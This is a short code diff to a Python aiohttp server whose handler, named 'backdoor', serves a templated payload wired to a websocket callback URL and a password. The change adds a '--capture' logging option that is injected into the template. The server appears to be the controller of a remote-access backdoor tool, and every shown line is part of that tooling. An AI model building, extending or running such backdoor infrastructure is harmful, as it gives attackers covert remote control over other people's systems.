@@ -127,6 +127,7 @@ def backdoor(request):
         fcont
         .replace('__url__', 'ws://{}/ws/'.format(webhost))
         .replace('__password__', setpassword)
+        .replace('__log__', 'nil' if request.app["log"] is None else "'"+request.app["log"]+"'")
     ))
 def main():
     global setpassword
@@ -134,6 +135,7 @@ def main():
     app = web.Application()
     app['port'] = args.port
     app['protocol_factory'] = protocol
+    app["log"]=args.capture
     setpassword=args.password
     app.router.add_get('/', backdoor)
     app.router.add_get('/ws/', ws)
